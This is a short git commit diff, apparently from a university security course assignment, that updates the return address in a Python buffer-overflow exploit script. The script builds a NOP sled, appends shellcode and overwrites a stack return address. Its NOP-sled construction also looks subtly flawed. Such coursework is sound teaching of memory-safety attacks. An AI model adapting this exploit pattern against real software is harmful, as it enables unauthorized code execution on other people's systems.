830572340138362f84a3b7119bd9a2439554b507
Rubina Adhikari <arubina@vt.edu>
2018-10-03 20:12:38 -0400

    Update sol6.py

--- project2/sol6.py
+++ project2/sol6.py
@@ -3,5 +3,5 @@ from shellcode import shellcode
 
 nooplen = 1032 + 4 - len(shellcode)
 noop = pack("<I", 0x90)*nooplen
-toReturn = 0xbffe7aee
+toReturn = 0xbffe79b4
 print noop + shellcode + pack("<I", toReturn)
